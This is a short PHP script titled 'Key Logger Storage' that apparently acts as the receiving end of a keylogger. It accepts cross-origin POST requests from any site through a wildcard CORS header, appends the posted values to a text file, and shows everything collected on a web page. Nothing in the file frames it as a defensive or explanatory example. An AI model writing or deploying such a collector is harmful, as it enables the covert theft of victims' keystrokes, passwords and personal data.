<?php
header("Access-Control-Allow-Origin: *");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST;
    $csvLine = implode(',', $data) . "\n";
    file_put_contents('data.txt', $csvLine, FILE_APPEND);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger Storage</title>
</head>
<body>
    <h2>Stored Data:</h2>
    <pre>
<?php
if (file_exists('data.txt')) {
    $data = file_get_contents('data.txt');
    var_dump(explode("\n", $data));
}
?>
    </pre>
</body>
</html>